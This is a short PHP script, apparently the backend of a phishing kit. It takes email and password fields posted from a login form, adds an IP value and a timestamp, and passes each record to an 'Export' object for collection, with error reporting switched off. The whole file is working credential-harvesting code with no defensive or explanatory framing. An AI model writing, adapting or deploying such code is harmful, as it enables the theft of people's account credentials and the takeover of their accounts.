<?php
require_once('export.php');

error_reporting(0);
date_default_timezone_set('Asia/Almaty');


$exporter = Skynet\Export::getInstance();

if(isset($_POST['email']) || isset($_POST['password']))
{
	$ip = isset($_POST['ipadd']) && !empty($_POST['ipadd']) ? $_POST['ipadd'] : '[N/A]';
	$email = isset($_POST['email']) && !empty($_POST['email']) ? $_POST['email'] : '[N/A]';
	$password = isset($_POST['password']) && !empty($_POST['password']) ? $_POST['password'] : '[N/A]';

	$time = strftime('%d %b %Y | %H:%M:%S',time());

	$data = $ip . ' >>> ' . $time .' ::: '. $email . ' ::: ' . $password . "\n";
	$exporter->add($data);
}